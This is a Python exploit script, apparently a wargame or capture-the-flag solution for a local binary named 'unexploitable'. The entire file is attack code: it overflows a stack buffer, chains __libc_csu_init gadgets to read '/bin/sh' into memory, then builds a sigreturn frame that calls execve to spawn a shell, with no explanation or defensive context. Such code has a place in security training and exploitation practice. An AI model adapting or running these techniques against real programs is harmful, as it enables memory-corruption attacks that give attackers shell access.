import sys, socket, struct, telnetlib, time
from subprocess import Popen, PIPE

def p(a): 
    return struct.pack("<Q",a)

def u(a):
    return struct.unpack("<Q",a)[0]

syscall = 0x00400560
read = 0x00400430
read_got = 0x601000
bss = 0x0000000000601028
csu_init1 = 0x4005e6
csu_init2 = 0x4005d0

# read "/bin/sh" to bss
buf = "A"*24
buf += p(csu_init1)
buf += p(0xdeadbeef)
buf += p(0) #rbx
buf += p(1) #rbp
buf += p(read_got) #r12
buf += p(0) #r13 to rdi
buf += p(bss) #r14 to rsi
buf += p(1000) #r15 to rdx
buf += p(csu_init2)
buf += "A"*56
buf += p(0x400544) # main

s = Popen(['./unexploitable'], stdin=PIPE, stdout=PIPE)

time.sleep(3)
s.stdin.write(buf)
time.sleep(0.1)
s.stdin.write("/bin/sh\0")

# sigreturn to call execve("/bin/sh",0,0)
buf = "A"*24
buf += p(read)
buf += p(syscall)
buf += "B"*40
buf += p(0) # r8
buf += p(0) #r9
buf += p(0) # r10
buf += p(0)*5 #r11-r15
buf += p(bss) #rdi
buf += p(0) #rsi
buf += p(0)*2 #rbp, rbx
buf += p(0) #rdx
buf += p(59) #rax
buf += p(0) #rcx
buf += p(bss) #rsp
buf += p(syscall) #rip
buf += p(0) #eflags
buf += p(0x33) #cs/gs/fs
buf += "A"*32
buf += p(0) #&fpstate


time.sleep(3)
s.stdin.write(buf)
time.sleep(0.1)
s.stdin.write("A"*15)

time.sleep(0.1)
s.stdin.write('exec <&2 >&2\n')

s.wait()
